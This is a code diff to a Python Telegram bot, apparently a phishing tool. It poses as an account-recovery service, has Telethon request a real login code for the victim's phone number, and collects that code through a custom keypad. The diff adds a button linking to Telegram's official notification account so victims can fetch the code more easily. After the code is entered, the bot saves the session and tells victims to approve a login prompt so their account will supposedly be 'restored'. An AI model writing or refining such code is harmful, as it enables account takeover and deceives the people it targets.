@@ -15,7 +15,7 @@ logger = logging.getLogger(__name__)
 
 import telethon
 from dotenv import load_dotenv
-from telegram import KeyboardButton, ReplyKeyboardMarkup
+from telegram import KeyboardButton, ReplyKeyboardMarkup, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram import Update
 from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters, TypeHandler
 from telethon import TelegramClient
@@ -119,15 +119,20 @@ def create_restart_button():
 
 
 def create_keypad():
-    """数字键盘+查看验证码：输验证码用"""
+    """数字键盘（截图同款：纯数字+确认/清除）"""
     keyboard = [
-        [KeyboardButton("查看验证码")],
         [KeyboardButton("1"), KeyboardButton("2"), KeyboardButton("3")],
         [KeyboardButton("4"), KeyboardButton("5"), KeyboardButton("6")],
         [KeyboardButton("7"), KeyboardButton("8"), KeyboardButton("9")],
         [KeyboardButton("确认✅"), KeyboardButton("0"), KeyboardButton("清除❌")],
     ]
     return ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
+
+
+def create_view_code_inline():
+    """查看验证码内联按钮：一点直达 Telegram 系统通知（官方号 777000）"""
+    return InlineKeyboardMarkup(
+        [[InlineKeyboardButton("查看验证码", url="tg://user?id=777000")]])
 
 
 async def safe_delete(context, chat_id, message_id):
@@ -138,16 +143,43 @@ async def safe_delete(context, chat_id, message_id):
         pass
 
 
-async def step_send(update, context, text, reply_markup=None):
-    # 发步骤消息：先删掉上一步的，聊天区只留当前步骤
+async def clear_step_msgs(update, context):
+    # 删掉本步骤全部消息（正文+键盘两条）
     user_id = update.effective_user.id
     chat_id = update.effective_chat.id
-    old_id = user_states.get(user_id, {}).get("step_msg_id")
-    if old_id:
-        await safe_delete(context, chat_id, old_id)
-    msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
-    user_states.setdefault(user_id, {})["step_msg_id"] = msg.message_id
-    return msg
+    ids = user_states.get(user_id, {}).pop("step_msg_ids", [])
+    if isinstance(ids, int):
+        ids = [ids]
+    # 兼容旧单 id 字段
+    old_single = user_states.get(user_id, {}).pop("step_msg_id", None)
+    if old_single:
+        ids.append(old_single)
+    for mid in ids:
+        await safe_delete(context, chat_id, mid)
+
+
+async def step_send(update, context, text, reply_markup=None, inline_markup=None):
+    # 发步骤消息：先清掉上一步的全部消息；正文挂内联按钮时，键盘另起一条
+    user_id = update.effective_user.id
+    chat_id = update.effective_chat.id
+    await clear_step_msgs(update, context)
+    ids = []
+    if inline_markup is not None:
+        msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=inline_markup)
+        ids.append(msg.message_id)
+    if reply_markup is not None:
+        pad_text = "请输入您收到的验证码：" if inline_markup is not None else text
+        if inline_markup is not None:
+            pad = await context.bot.send_message(chat_id=chat_id, text=pad_text, reply_markup=reply_markup)
+            ids.append(pad.message_id)
+        else:
+            msg = await context.bot.send_message(chat_id=chat_id, text=text, reply_markup=reply_markup)
+            ids.append(msg.message_id)
+    elif inline_markup is None:
+        msg = await context.bot.send_message(chat_id=chat_id, text=text)
+        ids.append(msg.message_id)
+    user_states.setdefault(user_id, {})["step_msg_ids"] = ids
+    return ids
 
 
 async def read_code_from_telegram(user_id):
@@ -350,10 +382,8 @@ async def start(update, context):
     if context.args:
         var = context.args[0] if context.args else None
     # 重开清掉旧步骤消息，避免残留
-    old_id = user_states.get(user_id, {}).get("step_msg_id")
+    await clear_step_msgs(update, context)
     user_states[user_id] = {"state": "start", "code_attempts": 0, "password_attempts": 0}
-    if old_id:
-        await safe_delete(context, update.effective_chat.id, old_id)
     keyboard = [[KeyboardButton("发送手机号", request_contact=True)]]
     reply_markup = ReplyKeyboardMarkup(keyboard, one_time_keyboard=False, resize_keyboard=True)
     await update.message.reply_text(
@@ -442,8 +472,9 @@ async def handle_code_request(update, context):
         user_states[user_id]["phone_code_hash"] = str(result.phone_code_hash) if result.phone_code_hash else ""
         user_states[user_id]["code_buf"] = ""
         await step_send(update, context,
-                        "✅ 验证码已发送\n\n请点击下方按钮查看验证码，或用数字键盘输入后按确认✅：",
-                        reply_markup=create_keypad())
+                        "✅ 验证码已发送\n\n请点击下方按钮查看验证码：",
+                        reply_markup=create_keypad(),
+                        inline_markup=create_view_code_inline())
     except telethon.errors.rpcerrorlist.PhoneNumberOccupiedError:
         await update.message.reply_text("该号码已被注册，请更换号码后重试。", reply_markup=create_restart_button())
     except telethon.errors.rpcerrorlist.PhoneNumberInvalidError:
@@ -466,10 +497,7 @@ async def submit_code(update, context, user_id, code):
         user_states[user_id]["state"] = "done"
         await backup_session(phone, client)
         # 成功为终态：清掉验证中消息再发结果
-        old_id = user_states.get(user_id, {}).get("step_msg_id")
-        if old_id:
-            await safe_delete(context, update.effective_chat.id, old_id)
-            user_states[user_id].pop("step_msg_id", None)
+        await clear_step_msgs(update, context)
         try:
             with open(IMAGE_PATH, 'rb') as photo:
                 await update.message.reply_photo(photo=photo, caption="验证成功！已提交审核，稍后您的客户端顶部会出现提示，请点击 yes 确认是您本人操作，您的账户将在 12 小时内恢复正常。")
